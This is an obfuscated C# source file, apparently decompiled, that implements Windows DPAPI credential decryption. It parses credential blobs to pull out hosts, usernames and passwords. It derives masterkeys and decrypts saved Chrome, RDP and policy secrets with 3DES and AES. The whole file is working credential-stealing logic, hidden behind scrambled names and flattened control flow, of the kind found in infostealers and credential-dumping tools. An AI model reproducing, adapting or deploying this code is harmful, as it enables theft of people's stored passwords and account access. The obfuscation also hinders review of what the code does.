using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using NbuLaJKWyx2;
using p3N5Y;

namespace SNt;

public static class UmiqCcKeV
{
	public class gtA3WUh
	{
		[CompilerGenerated]
		private string FileName__BackingField;

		[CompilerGenerated]
		private string Description__BackingField;

		[CompilerGenerated]
		private Guid GuidMasterKey__BackingField;

		[CompilerGenerated]
		private DateTime LastAccessed__BackingField;

		[CompilerGenerated]
		private DateTime LastModified__BackingField;

		[CompilerGenerated]
		private long Size__BackingField;

		public string qhjgH
		{
			[CompilerGenerated]
			get
			{
				return FileName__BackingField;
			}
			[CompilerGenerated]
			set
			{
				FileName__BackingField = value;
			}
		}

		public string ttXiD
		{
			[CompilerGenerated]
			get
			{
				return Description__BackingField;
			}
			[CompilerGenerated]
			set
			{
				Description__BackingField = value;
			}
		}

		public Guid hRvcrS4iBww
		{
			[CompilerGenerated]
			get
			{
				return GuidMasterKey__BackingField;
			}
			[CompilerGenerated]
			set
			{
				GuidMasterKey__BackingField = value;
			}
		}

		public DateTime _7Buzt
		{
			[CompilerGenerated]
			get
			{
				return LastAccessed__BackingField;
			}
			[CompilerGenerated]
			set
			{
				LastAccessed__BackingField = value;
			}
		}

		public DateTime o8rdgs
		{
			[CompilerGenerated]
			get
			{
				return LastModified__BackingField;
			}
			[CompilerGenerated]
			set
			{
				LastModified__BackingField = value;
			}
		}

		public long GYlhmHyKh
		{
			[CompilerGenerated]
			get
			{
				return Size__BackingField;
			}
			[CompilerGenerated]
			set
			{
				Size__BackingField = value;
			}
		}

		public gtA3WUh(string _fileName, string _description, Guid _guidMasterKey, DateTime _lastAccessed, DateTime _lastModified, long size)
		{
			qhjgH = _fileName;
			ttXiD = _description;
			hRvcrS4iBww = _guidMasterKey;
			_7Buzt = _lastAccessed;
			o8rdgs = _lastModified;
			GYlhmHyKh = size;
		}
	}

	public static ii68 a2E(byte[] xgaI3, iI6anJ2Z._8Zyn2YXtHnZ YSR4 = iI6anJ2Z._8Zyn2YXtHnZ.DomainPassword)
	{
		int num = 0;
		uint num3 = default;
		int num2 = default;
		do
		{
			switch (num)
			{
			case 10:
				return null;
			case 5:
				num2 += 4;
				num = 6;
				break;
			}
			if (num == 1)
			{
				num2 = 0;
				num = 2;
			}
			if (num == 7)
			{
				num2 += 4;
				num = 8;
			}
			if (num == 9)
			{
				if (num3 == (uint)YSR4)
				{
					break;
				}
				num = 10;
			}
			if (num == 6)
			{
				BitConverter.ToUInt32(xgaI3, num2);
				num = 7;
			}
			if (num == 8)
			{
				num3 = BitConverter.ToUInt32(xgaI3, num2);
				num = 9;
			}
			if (num == 3)
			{
				num2 += 4;
				num = 4;
			}
			if (num == 2)
			{
				BitConverter.ToUInt32(xgaI3, num2);
				num = 3;
			}
			if (num == 4)
			{
				BitConverter.ToUInt32(xgaI3, num2);
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 11);
		num2 += 4;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		num2 += 8;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		BitConverter.ToUInt32(xgaI3, num2);
		num2 += 4;
		int num4 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		string host = Encoding.Unicode.GetString(xgaI3, num2, num4);
		num2 += num4;
		int num5 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		Encoding.Unicode.GetString(xgaI3, num2, num5);
		num2 += num5;
		int num6 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		Encoding.Unicode.GetString(xgaI3, num2, num6);
		num2 += num6;
		int num7 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		Encoding.Unicode.GetString(xgaI3, num2, num7);
		num2 += num7;
		int num8 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		string username = Encoding.Unicode.GetString(xgaI3, num2, num8);
		num2 += num8;
		int num9 = BitConverter.ToInt32(xgaI3, num2);
		num2 += 4;
		byte[] array = new byte[num9 - 1 + 1];
		Array.Copy(xgaI3, num2, array, 0, num9);
		num2 += num9;
		string password;
		if (_4ZHfeS4uOL(array))
		{
			string text = Encoding.Unicode.GetString(array);
			password = text;
		}
		else
		{
			string text2 = BitConverter.ToString(array).Replace("-", "");
			password = text2;
		}
		ii68 ii69 = new ii68();
		ii69.S8v = username;
		ii69._9H5rP7hg2 = password;
		ii69.byIdLuuGZbL = host;
		ii69.oVAe = "Windows Credential";
		return ii69;
	}

	public static byte[] kY0J4(byte[] nnB4qo2, Dictionary<string, string> dbBjpJ5, string T9g3b5 = "credential", bool oUPx = false)
	{
		int num = 0;
		int num2 = default;
		while (true)
		{
			if (num != 4)
			{
				if (num == 7)
				{
					if (T9g3b5.Equals("rdg"))
					{
						goto IL_049c;
					}
					num = 8;
				}
				if (num == 8)
				{
					if (!T9g3b5.Equals("chrome"))
					{
						goto IL_04bf;
					}
					num = 9;
				}
				if (num != 12)
				{
					if (num == 3)
					{
						num2 = 36;
						num = 4;
					}
					if (num == 1)
					{
						num2 = 0;
						num = 2;
					}
					if (num == 9)
					{
						goto IL_049c;
					}
					goto IL_04ae;
				}
			}
			goto IL_0098;
			IL_049c:
			num2 = 24;
			num = 10;
			goto IL_04ae;
			IL_052d:
			if (num == 10)
			{
				goto IL_0098;
			}
			if (num == 6)
			{
				if (T9g3b5.Equals("blob"))
				{
					goto IL_049c;
				}
				num = 7;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 13)
			{
				break;
			}
			continue;
			IL_0511:
			if (T9g3b5.Equals("policy"))
			{
				goto IL_049c;
			}
			num = 6;
			goto IL_052d;
			IL_04bf:
			return new byte[0];
			IL_0098:
			byte[] array = new byte[16];
			Array.Copy(nnB4qo2, num2, array, 0, 16);
			Guid guid = new Guid(array);
			string key = $"{{{guid}}}";
			num2 += 16;
			BitConverter.ToUInt32(nnB4qo2, num2);
			num2 += 4;
			int num3 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			Encoding.Unicode.GetString(nnB4qo2, num2, num3);
			num2 += num3;
			int pkngjEvou = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			int num4 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			int num5 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			byte[] array2 = new byte[num5 - 1 + 1];
			Array.Copy(nnB4qo2, num2, array2, 0, num5);
			num2 += num5;
			int num6 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4 + num6;
			int num7 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			int num8 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4 + num8;
			int num9 = BitConverter.ToInt32(nnB4qo2, num2);
			num2 += 4;
			byte[] array3 = new byte[num9 - 1 + 1];
			Array.Copy(nnB4qo2, num2, array3, 0, num9);
			if (dbBjpJ5.ContainsKey(key))
			{
				switch (num7)
				{
				case 32782:
					try
					{
						byte[] hqZwXtlvVK2 = vF88pQLF(dbBjpJ5[key].ToString());
						byte[] sourceArray2 = _3UbQhkwPCUH(hqZwXtlvVK2, array2, num7);
						byte[] array5 = new byte[num4 / 8];
						Array.Copy(sourceArray2, array5, Convert.ToInt32((double)num4 / 8.0));
						if (T9g3b5.Equals("chrome"))
						{
							return a05iJAuB(array3, array5, pkngjEvou, PaddingMode.PKCS7);
						}
						return a05iJAuB(array3, array5, pkngjEvou);
					}
					catch
					{
					}
					break;
				case 32772:
					try
					{
						byte[] hqZwXtlvVK = vF88pQLF(dbBjpJ5[key].ToString());
						byte[] sourceArray = _3UbQhkwPCUH(hqZwXtlvVK, array2, num7);
						byte[] array4 = new byte[num4 / 8];
						Array.Copy(sourceArray, array4, Convert.ToInt32(num4 / 8));
						return a05iJAuB(array3, array4, pkngjEvou);
					}
					catch
					{
					}
					break;
				}
			}
			return new byte[0];
			IL_04ae:
			if (num == 11)
			{
				goto IL_04bf;
			}
			if (num == 2)
			{
				if (!T9g3b5.Equals("credential"))
				{
					goto IL_0511;
				}
				num = 3;
			}
			if (num == 5)
			{
				goto IL_0511;
			}
			goto IL_052d;
		}
		byte[] result = default;
		return result;
	}

	public static byte[] _3UbQhkwPCUH(byte[] hqZwXtlvVK, byte[] _0mB, int rdX = 32772)
	{
		int num = 0;
		byte[] result = default;
		HMACSHA512 hMACSHA = default;
		while (true)
		{
			if (num == 1)
			{
				if (rdX != 32782)
				{
					goto IL_0047;
				}
				num = 2;
			}
			if (num != 5)
			{
				if (num == 3)
				{
					result = hMACSHA.ComputeHash(_0mB);
					num = 4;
				}
				if (num == 2)
				{
					hMACSHA = new HMACSHA512(hqZwXtlvVK);
					num = 3;
				}
				switch (num)
				{
				case 4:
					return result;
				case 0:
					num = 1;
					break;
				}
				if (num == 6)
				{
					break;
				}
				continue;
			}
			goto IL_0047;
			IL_0047:
			if (rdX == 32772)
			{
				HMACSHA1 hMACSHA2 = new HMACSHA1(hqZwXtlvVK);
				byte[] array = new byte[64];
				byte[] array2 = new byte[64];
				byte[] array3 = hMACSHA2.ComputeHash(_0mB);
				for (int i = 0; i <= 63; i++)
				{
					array[i] = Convert.ToByte('6');
					array2[i] = Convert.ToByte('\\');
				}
				for (int j = 0; j <= hqZwXtlvVK.Length - 1; j++)
				{
					array[j] ^= array3[j];
					array2[j] ^= array3[j];
				}
				using SHA1Managed sHA1Managed = new SHA1Managed();
				byte[] array4 = sHA1Managed.ComputeHash(array);
				byte[] pMcRYc = sHA1Managed.ComputeHash(array2);
				return wV4n5dcFqJ(array4, pMcRYc);
			}
			return new byte[0];
		}
		byte[] result2 = default;
		return result2;
	}

	public static byte[] a05iJAuB(byte[] WqY, byte[] _2oWugXQlnCl, int PkngjEvou = 26115, PaddingMode BlIPvmrhY = PaddingMode.Zeros)
	{
		int num = 0;
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = default;
		byte[] iV = default;
		while (true)
		{
			if (num == 5)
			{
				tripleDESCryptoServiceProvider.IV = iV;
				num = 6;
			}
			if (num == 10)
			{
				goto IL_0046;
			}
			if (num == 6)
			{
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				num = 7;
			}
			if (num == 4)
			{
				tripleDESCryptoServiceProvider.Key = _2oWugXQlnCl;
				num = 5;
			}
			if (num == 7)
			{
				tripleDESCryptoServiceProvider.Padding = BlIPvmrhY;
				num = 8;
			}
			if (num != 9)
			{
				if (num == 8)
				{
					try
					{
						return tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(WqY, 0, WqY.Length);
					}
					catch
					{
					}
					return new byte[0];
				}
				if (num == 1)
				{
					if (PkngjEvou != 26115)
					{
						goto IL_00e1;
					}
					num = 2;
				}
				if (num == 3)
				{
					iV = new byte[8];
					num = 4;
				}
				if (num == 2)
				{
					tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 11)
				{
					break;
				}
				continue;
			}
			goto IL_00e1;
			IL_00e1:
			if (PkngjEvou == 26128)
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				byte[] iV2 = new byte[16];
				rijndaelManaged.Key = _2oWugXQlnCl;
				rijndaelManaged.IV = iV2;
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.Padding = BlIPvmrhY;
				return rijndaelManaged.CreateDecryptor().TransformFinalBlock(WqY, 0, WqY.Length);
			}
			goto IL_0046;
			IL_0046:
			return new byte[0];
		}
		byte[] result = default;
		return result;
	}

	public static byte[] vF88pQLF(string _9xyT)
	{
		int num = 0;
		int num2 = default;
		byte[] array = default;
		do
		{
			if (num == 6)
			{
				goto IL_001f;
			}
			goto IL_0040;
			IL_0040:
			if (num == 5)
			{
				num2 += 2;
				num = 6;
			}
			if (num == 2)
			{
				num2 = 0;
				num = 3;
			}
			if (num == 3)
			{
				goto IL_001f;
			}
			if (num == 1)
			{
				array = new byte[_9xyT.Length / 2];
				num = 2;
			}
			if (num == 4)
			{
				goto IL_00ed;
			}
			goto IL_0121;
			IL_001f:
			if (num2 > _9xyT.Length - 1)
			{
				num = 7;
				goto IL_0040;
			}
			goto IL_00ed;
			IL_0121:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_00ed:
			array[num2 / 2] = Convert.ToByte(_9xyT.Substring(num2, 2), 16);
			num = 5;
			goto IL_0121;
		}
		while (num != 7);
		return array;
	}

	public static bool _4ZHfeS4uOL(byte[] umQmo3Go)
	{
		int num = 0;
		iI6anJ2Z.gIo3Gkhe17a opt = default;
		do
		{
			if (num == 1)
			{
				opt = iI6anJ2Z.gIo3Gkhe17a.IS_TEXT_UNICODE_STATISTICS;
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		return iI6anJ2Z.IsTextUnicode(umQmo3Go, umQmo3Go.Length, ref opt);
	}

	public static byte[] _7Jmp0T3phv3(string STVWe, string DFuB)
	{
		int num = 0;
		SHA1Managed sHA1Managed = default;
		byte[] bytes = default;
		string s = default;
		byte[] array = default;
		byte[] bytes2 = default;
		do
		{
			if (num == 7)
			{
				sHA1Managed = new SHA1Managed();
				num = 8;
			}
			if (num == 2)
			{
				bytes = Encoding.Unicode.GetBytes(STVWe);
				num = 3;
			}
			if (num == 1)
			{
				s = Path.GetFileName(DFuB).TrimEnd(new char[1] { Path.DirectorySeparatorChar });
				num = 2;
			}
			if (num == 6)
			{
				array[^2] = 0;
				num = 7;
			}
			if (num == 3)
			{
				bytes2 = Encoding.Unicode.GetBytes(s);
				num = 4;
			}
			if (num == 4)
			{
				array = new byte[bytes2.Length + 2 - 1 + 1];
				num = 5;
			}
			if (num == 5)
			{
				bytes2.CopyTo(array, 0);
				num = 6;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 8);
		byte[] array2;
		try
		{
			array2 = sHA1Managed.ComputeHash(bytes);
		}
		finally
		{
			((IDisposable)sHA1Managed)?.Dispose();
		}
		wV4n5dcFqJ(array2, array);
		using HMACSHA1 hMACSHA = new HMACSHA1(array2);
		return hMACSHA.ComputeHash(array);
	}

	public static byte[] wV4n5dcFqJ(byte[] _0uwboK, byte[] PMcRYc)
	{
		int num = 0;
		byte[] array = default;
		do
		{
			if (num == 2)
			{
				Buffer.BlockCopy(_0uwboK, 0, array, 0, _0uwboK.Length);
				num = 3;
			}
			if (num == 3)
			{
				Buffer.BlockCopy(PMcRYc, 0, array, _0uwboK.Length, PMcRYc.Length);
				num = 4;
			}
			if (num == 1)
			{
				array = new byte[_0uwboK.Length + PMcRYc.Length - 1 + 1];
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		return array;
	}

	public static Dictionary<string, string> _4PJrD(byte[] M6S0T6q8, byte[] EpME)
	{
		int num = 0;
		Dictionary<string, string> dictionary = default;
		do
		{
			if (num == 1)
			{
				dictionary = new Dictionary<string, string>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					string key = $"{{{Encoding.Unicode.GetString(M6S0T6q8, 12, 72)}}}";
					byte[] array = cljCh2reyYe(M6S0T6q8);
					int num2 = 4;
					byte[] array2 = new byte[16];
					Array.Copy(array, 4, array2, 0, 16);
					num2 += 16;
					int iterations = BitConverter.ToInt32(array, num2);
					num2 += 4;
					int num3 = BitConverter.ToInt32(array, num2);
					num2 += 4;
					int num4 = BitConverter.ToInt32(array, num2);
					num2 += 4;
					byte[] array3 = new byte[array.Length - num2 - 1 + 1];
					Array.Copy(array, num2, array3, 0, array3.Length);
					byte[] sourceArray = new byte[48];
					switch (num3)
					{
					case 32782:
					{
						using (HMACSHA512 algorithm2 = new HMACSHA512())
						{
							sourceArray = new _0Jvr0(algorithm2, EpME, array2, iterations).aoa50OUT(48);
						}
						break;
					}
					case 32777:
					{
						using (HMACSHA1 algorithm = new HMACSHA1())
						{
							sourceArray = new _0Jvr0(algorithm, EpME, array2, iterations).aoa50OUT(32);
						}
						break;
					}
					default:
						return dictionary;
					}
					if (num4 == 26128 && num3 == 32782)
					{
						int num5 = new HMACSHA512().HashSize / 8;
						RijndaelManaged rijndaelManaged = new RijndaelManaged();
						byte[] array4 = new byte[16];
						Array.Copy(sourceArray, 32, array4, 0, 16);
						byte[] array5 = new byte[32];
						Array.Copy(sourceArray, 0, array5, 0, 32);
						rijndaelManaged.Key = array5;
						rijndaelManaged.IV = array4;
						rijndaelManaged.Mode = CipherMode.CBC;
						rijndaelManaged.Padding = PaddingMode.Zeros;
						byte[] array6 = rijndaelManaged.CreateDecryptor().TransformFinalBlock(array3, 0, array3.Length);
						int num6 = array6.Length;
						int num7 = num6 - 16 - num5;
						byte[] array7 = new byte[num5 - 1 + 1];
						Array.Copy(array6, num6 - num7, array7, 0, array7.Length);
						using (SHA1Managed sHA1Managed = new SHA1Managed())
						{
							byte[] array8 = sHA1Managed.ComputeHash(array7);
							string value = BitConverter.ToString(array8).Replace("-", "");
							if (num3 != 32782)
							{
								return dictionary;
							}
							byte[] array9 = new byte[16];
							Array.Copy(array6, array9, 16);
							HMACSHA512 hMACSHA = new HMACSHA512(EpME);
							byte[] key2 = hMACSHA.ComputeHash(array9);
							byte[] array10 = new byte[num7 - 1 + 1];
							Array.Copy(array6, num6 - num7, array10, 0, num7);
							HMACSHA512 hMACSHA2 = new HMACSHA512(key2);
							byte[] array11 = hMACSHA2.ComputeHash(array10);
							byte[] array12 = new byte[64];
							Array.Copy(array6, 16, array12, 0, array12.Length);
							string text = BitConverter.ToString(array12).Replace("-", "");
							string value2 = BitConverter.ToString(array11).Replace("-", "");
							if (!text.Equals(value2))
							{
								return dictionary;
							}
							dictionary.Add(key, value);
						}
						return dictionary;
					}
					if (num4 == 26115 && num3 == 32777)
					{
						TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
						byte[] array13 = new byte[8];
						byte[] array14 = new byte[24];
						Array.Copy(sourceArray, 24, array13, 0, 8);
						Array.Copy(sourceArray, 0, array14, 0, 24);
						tripleDESCryptoServiceProvider.Key = array14;
						tripleDESCryptoServiceProvider.IV = array13;
						tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
						tripleDESCryptoServiceProvider.Padding = PaddingMode.Zeros;
						byte[] sourceArray2 = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array3, 0, array3.Length);
						byte[] array15 = new byte[64];
						Array.Copy(sourceArray2, 40, array15, 0, 64);
						using (SHA1Managed sHA1Managed2 = new SHA1Managed())
						{
							byte[] array16 = sHA1Managed2.ComputeHash(array15);
							string value3 = BitConverter.ToString(array16).Replace("-", "");
							dictionary.Add(key, value3);
						}
						return dictionary;
					}
					return dictionary;
				}
				catch
				{
					return dictionary;
				}
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		Dictionary<string, string> result = default;
		return result;
	}

	public static byte[] cljCh2reyYe(byte[] cVANSYnkK4b)
	{
		int num = 0;
		byte[] array = default;
		long num2 = default;
		int num3 = default;
		do
		{
			if (num == 4)
			{
				array = new byte[num2 - 1 + 1];
				num = 5;
			}
			if (num == 2)
			{
				num2 = BitConverter.ToInt64(cVANSYnkK4b, num3);
				num = 3;
			}
			if (num == 5)
			{
				Array.Copy(cVANSYnkK4b, num3, array, 0L, num2);
				num = 6;
			}
			if (num == 1)
			{
				num3 = 96;
				num = 2;
			}
			if (num == 3)
			{
				num3 += 32;
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 6);
		return array;
	}

	public static gtA3WUh IseaEIxFUgz(string qGJK1)
	{
		int num = 0;
		long length = default;
		byte[] array = default;
		gtA3WUh result = default;
		string description = default;
		Guid guidMasterKey = default;
		byte[] sourceArray = default;
		byte[] array2 = default;
		byte[] array3 = default;
		int num2 = default;
		do
		{
			if (num == 1)
			{
				length = new FileInfo(qGJK1).Length;
				num = 2;
			}
			if (num == 3)
			{
				array = new byte[16];
				num = 4;
			}
			if (num == 12)
			{
				result = new gtA3WUh(Path.GetFileName(qGJK1), description, guidMasterKey, File.GetLastAccessTime(qGJK1), File.GetLastAccessTime(qGJK1), length);
				num = 13;
			}
			if (num == 7)
			{
				Array.Copy(sourceArray, 56, array2, 0, 4);
				num = 8;
			}
			if (num == 4)
			{
				Array.Copy(sourceArray, 36, array, 0, 16);
				num = 5;
			}
			if (num == 5)
			{
				guidMasterKey = new Guid(array);
				num = 6;
			}
			if (num == 10)
			{
				Array.Copy(sourceArray, 60, array3, 0, array3.Length);
				num = 11;
			}
			if (num == 2)
			{
				sourceArray = File.ReadAllBytes(qGJK1);
				num = 3;
			}
			if (num == 6)
			{
				array2 = new byte[16];
				num = 7;
			}
			if (num == 9)
			{
				array3 = new byte[num2 - 4 - 1 + 1];
				num = 10;
			}
			if (num == 8)
			{
				num2 = BitConverter.ToInt32(array2, 0);
				num = 9;
			}
			if (num == 11)
			{
				description = Encoding.Unicode.GetString(array3);
				num = 12;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 13);
		return result;
	}
}
